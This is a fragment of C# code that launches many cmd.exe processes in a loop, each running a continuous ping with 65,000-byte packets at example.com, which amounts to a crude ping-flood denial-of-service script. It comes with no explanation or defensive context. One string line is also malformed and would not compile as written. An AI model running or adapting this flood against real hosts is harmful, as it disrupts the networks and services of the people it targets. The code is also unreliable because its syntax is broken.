    System.Diagnostics.Process proc;
    cmd = @"strCmdLine = "/C ping example.com -t -l 65000";
    for (i = 1; i < n; i++)
    {
        proc = new System.Diagnostics.Process();
        proc.EnableRaisingEvents = false;
        proc.StartInfo.FileName = "cmd";
        proc.StartInfo.Arguments = cmd;
        proc.Start();
    }
